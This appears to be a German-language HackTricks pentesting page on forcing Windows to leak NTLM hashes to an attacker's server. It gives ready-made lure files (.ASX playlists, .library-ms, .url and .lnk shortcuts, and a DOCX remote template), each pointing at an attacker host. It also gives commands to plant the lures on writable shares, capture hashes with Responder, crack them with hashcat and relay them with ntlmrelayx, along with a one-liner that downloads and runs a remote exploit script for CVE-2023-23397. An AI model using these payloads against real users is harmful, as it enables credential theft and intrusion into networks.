# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Schau dir alle großartigen Ideen aus [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) vom Download einer Microsoft-Word-Datei online bis zur ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md und [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Wenn du **in eine Share schreiben kannst, die Nutzer oder geplante Jobs im Explorer durchsuchen**, lege Dateien ab, deren Metadaten auf deine UNC zeigen (z. B. `\\ATTACKER\share`). Das Rendern des Ordners löst **implizite SMB-Authentifizierung** aus und leakt einen **NetNTLMv2** an deinen Listener.

1. **Lures erzeugen** (deckt SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc. ab)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Auf die beschreibbare Freigabe legen** (beliebigen Ordner, den das Opfer öffnet):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows kann mehrere Dateien gleichzeitig treffen; alles, was der Explorer in der Vorschau anzeigt (`BROWSE TO FOLDER`), erfordert keine Klicks.

### Windows Media Player playlists (.ASX/.WAX)

Wenn du ein Ziel dazu bringst, eine Windows Media Player playlist zu öffnen oder anzusehen, die du kontrollierst, kannst du Net‑NTLMv2 leaken, indem du den Eintrag auf einen UNC-Pfad verweist. WMP versucht, die referenzierte media über SMB abzurufen und authentifiziert sich dabei implizit.

Beispiel-Payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Sammlung und Cracking-Flow:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer behandelt .library-ms Dateien unsicher, wenn sie direkt aus einem ZIP-Archiv geöffnet werden. Wenn die Library-Definition auf einen entfernten UNC-Pfad zeigt (z. B. \\attacker\share), reicht es aus, die .library-ms im ZIP einfach zu browsen/zu starten, damit Explorer den UNC enumeriert und NTLM-Authentifizierung an den Angreifer sendet. Dadurch erhält man ein NetNTLMv2, das offline geknackt oder potenziell relayed werden kann.

Minimale .library-ms, die auf einen attacker UNC zeigt
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operative Schritte
- Erstelle die .library-ms-Datei mit dem obigen XML (setze deine IP/Hostname).
- ZIPpe sie (unter Windows: Senden an → Komprimierter (ZIP-)Ordner) und liefere das ZIP an das Ziel.
- Starte einen NTLM capture listener und warte darauf, dass das Opfer die .library-ms von innerhalb des ZIP öffnet.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook für Windows verarbeitete die erweiterte MAPI-Property PidLidReminderFileParameter in Kalendereinträgen. Wenn diese Property auf einen UNC path zeigt (z. B. \\attacker\share\alert.wav), würde Outlook die SMB share kontaktieren, wenn die Erinnerung ausgelöst wird, und dabei ohne irgendeinen Klick das Net-NTLMv2 des Benutzers leak. Dies wurde am 14. März 2023 gepatcht, ist aber weiterhin hoch relevant für Legacy-/untouched fleets und für historische incident response.

Schnelle exploitation mit PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener-Seite:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notizen
- Ein Opfer braucht nur Outlook for Windows, das läuft, wenn die Erinnerung ausgelöst wird.
- Der leak liefert Net‑NTLMv2, geeignet für Offline-Cracking oder Relay (nicht pass-the-hash).


### .LNK/.URL icon-based zero-click NTLM leak (CVE-2025-50154 – bypass of CVE-2025-24054)

Windows Explorer rendert Shortcut-Symbole automatisch. Jüngste Forschung zeigte, dass es selbst nach Microsofts April-2025-Patch für UNC-icon-Shortcuts weiterhin möglich war, NTLM-Authentifizierung ohne Klick auszulösen, indem das Shortcut-Ziel auf einem UNC-Pfad gehostet und das Icon lokal gehalten wurde (Patch-Bypass zugewiesen CVE-2025-50154). Allein das Anzeigen des Ordners veranlasst Explorer, Metadaten vom entfernten Ziel abzurufen und dabei NTLM an den SMB-Server des Angreifers zu senden.

Minimales Internet-Shortcut-Payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery-Ideen
- Drop the shortcut in a ZIP and get the victim to browse it.
- Place the shortcut on a writable share the victim will open.
- Combine with other lure files in the same folder so Explorer previews the items.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows lädt `.lnk`-Metadaten während **view/preview** (icon rendering), nicht nur bei der Ausführung. CVE‑2026‑25185 zeigt einen Parsing-Pfad, bei dem **ExtraData**-Blöcke dazu führen, dass die Shell einen icon path auflöst und das Filesystem **während des Ladens** berührt, wodurch outbound NTLM gesendet wird, wenn der path remote ist.

Wichtige Trigger-Bedingungen (beobachtet in `CShellLink::_LoadFromStream`):
- **DARWIN_PROPS** (`0xa0000006`) in ExtraData einfügen (Gate zur icon update routine).
- **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) mit befülltem **TargetUnicode** einfügen.
- Der Loader erweitert environment variables in `TargetUnicode` und ruft `PathFileExistsW` auf dem resultierenden path auf.

Wenn `TargetUnicode` auf einen UNC path aufgelöst wird (z. B. `\\attacker\share\icon.ico`), verursacht **bereits das bloße Anzeigen eines Ordners** mit der shortcut-Datei outbound authentication. Derselbe Load-Pfad kann auch durch **indexing** und **AV scanning** ausgelöst werden, was ihn zu einer praktischen no-click leak-Oberfläche macht.

Research-Tooling (parser/generator/UI) ist im **LnkMeMaybe**-Projekt verfügbar, um diese Strukturen ohne die Windows-GUI zu erstellen/zu inspizieren.


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

Der native **WebDAV client** kann missbraucht werden, um die aktuelle logon session dazu zu zwingen, sich bei einem beliebigen **HTTP/WebDAV**-Endpoint zu authentifizieren:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Warum das nützlich ist:
- Gegen einen **attacker-controlled WebDAV server** kann es **NTLM over HTTP** auslösen, ohne einen Custom Client abzulegen.
- Gegen **interne Hosts** ist es ein unauffälliger Weg, um zu **validieren, wo gestohlene Credentials akzeptiert werden**, bevor man sich lateral bewegt.
- Der Befehl ist eine gute Alternative, wenn **SMB egress gefiltert** ist, aber **HTTP/WebDAV** noch erreichbar ist.

Operative Hinweise:
- Der **WebClient**-Service muss auf dem Quell-Host laufen.
- `rundll32.exe` lädt `davclnt.dll` und lässt Windows die WebDAV-Authentifizierung mit den **current user's credentials** verarbeiten.
- Wenn du ihn auf eine Infrastruktur zeigst, die du kontrollierst, verwende einen NTLM-aware HTTP listener/relay wie:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Aus Sicht der Detection sind wiederholte `rundll32.exe davclnt.dll,DavSetCookie`-Ausführungen gegen viele interne Systeme ein starkes Signal für **credential validation / spray-like lateral movement prep** und nicht für normales User-Verhalten.

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office-Dokumente können eine externe Vorlage referenzieren. Wenn du die angehängte Vorlage auf einen UNC-Pfad setzt, authentifiziert sich das Öffnen des Dokuments bei SMB.

Minimale DOCX-Relationship-Änderungen (innerhalb von word/):

1) Bearbeite word/settings.xml und füge die Referenz für die angehängte Vorlage hinzu:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Bearbeite word/_rels/settings.xml.rels und verweise rId1337 auf deinen UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Zu .docx neu verpacken und ausliefern. Starte deinen SMB capture listener und warte auf das Öffnen.

Für post-capture Ideen zum Relaying oder Ausnutzen von NTLM, siehe:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
